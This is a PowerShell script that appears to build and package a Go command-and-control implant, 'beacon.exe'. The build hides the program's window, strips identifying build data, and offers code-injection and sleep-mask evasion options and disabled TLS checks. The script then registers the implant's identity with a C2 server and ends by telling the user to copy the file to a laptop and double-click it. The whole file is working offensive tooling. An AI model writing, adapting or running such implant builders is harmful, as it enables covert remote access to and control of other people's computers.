param(
    [string]$Seed = "",
    [string]$ServerPub = "a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209",
    [string]$ServerUrl = "http://127.0.0.1:9002",
    [string]$ApiKey = "opkey",
    [string]$Edge = "",
    [string]$EdgePort = "7443",
    [int]$SleepSecs = 15,
    [string]$OutDir = (Join-Path $PSScriptRoot "laptop-pkg"),
    [switch]$NoInject,
    [switch]$SleepMask,
    [switch]$Insecure,
    [switch]$SkipRegister
)
$ErrorActionPreference = "Stop"
$repo = Split-Path -Parent $PSScriptRoot
$genidExe = Join-Path $repo "cmd\genid.exe"
$go = "C:\Program Files\Go\bin\go.exe"

if (-not (Test-Path -LiteralPath $OutDir)) { New-Item -ItemType Directory -Path $OutDir | Out-Null }

if ([string]::IsNullOrWhiteSpace($Seed)) {
    $Seed = -join ((1..32) | ForEach-Object { '{0:x2}' -f (Get-Random -Maximum 256) })
    "--- new identity: seed $Seed ---"
}

& $go build -trimpath -buildvcs=false -o $genidExe ./cmd/genid
if ($LASTEXITCODE -ne 0) { throw "genid build failed" }

$ident = & $genidExe $Seed
if ($LASTEXITCODE -ne 0) { throw "genid failed" }
$pub = ($ident | Select-String "pub=(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value })
$sid = ($ident | Select-String "sid=(.+)" | ForEach-Object { $_.Matches[0].Groups[1].Value })

if ([string]::IsNullOrWhiteSpace($Edge)) {
    $route = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue |
        Sort-Object RouteMetric | Select-Object -First 1
    $ip = ""
    if ($route) {
        $ip = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
            Select-Object -First 1).IPAddress
    }
    if ([string]::IsNullOrWhiteSpace($ip)) { $ip = "127.0.0.1" }
    $Edge = "http://$ip`:$EdgePort"
}

$buildID = -join ((1..16) | ForEach-Object { '{0:x}' -f (Get-Random -Maximum 16) })
$tags = if ($NoInject) { "" } else { "-tags inject" }
$ldflags = "-s -w -H windowsgui -buildid $buildID" +
    " -X main.cfgSeed=$Seed" +
    " -X main.cfgServerPub=$ServerPub" +
    " -X main.cfgEdge=$Edge" +
    " -X main.cfgSleepSecs=$SleepSecs" +
    " -X main.cfgLogFile=beacon.log"
if ($SleepMask) { $ldflags += " -X main.cfgSleepMask=true" }
if ($Insecure) { $ldflags += " -X main.cfgInsecure=true" }
if ($Insecure) { $ldflags += " -X main.cfgInsecure=true" }
$out = Join-Path $OutDir "beacon.exe"
$args = @("build", "-trimpath", "-buildvcs=false") + ($tags -split " ") + @("-ldflags", $ldflags, "-o", $out, "./cmd/beacon")
& $go @args
if ($LASTEXITCODE -ne 0) { throw "beacon build failed" }

Remove-Item -LiteralPath (Join-Path $OutDir "launch.cmd") -ErrorAction SilentlyContinue

"--- package ---"
Get-ChildItem -LiteralPath $OutDir | Select-Object Name, Length | Format-Table -AutoSize | Out-String

"--- register on the server ($ServerUrl) ---"
if ($SkipRegister) {
    "skipped (-SkipRegister). register manually later:"
    "POST /api/v1/sessions  id=$sid  agent_pub=$pub"
} else {
    $body = @{ id = $sid; agent_pub = $pub } | ConvertTo-Json
    try {
        $r = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/v1/sessions" `
            -Headers @{ Authorization = "Bearer $ApiKey" } -ContentType "application/json" `
            -Body $body -TimeoutSec 10
        "registered: sid=$($r.id) beacons=$($r.beacons)"
    } catch {
        "WARNING: session registration failed: $($_.Exception.Message)"
        "  the server must be up on $ServerUrl (Bearer $ApiKey); deploy anyway and register with:"
        "POST /api/v1/sessions  id=$sid  agent_pub=$pub"
    }
}

"--- edge candidates (tried in order, first reachable wins) ---"
($Edge -split ",") | ForEach-Object { "  " + $_.Trim() }
if ($Insecure) { "--- TLS: certificate verification disabled (baked -Insecure) ---" }
"--- copy beacon.exe to the laptop and double-click it ---"
"  $out"
"  seed (keep for redeploys of the same identity): $Seed"
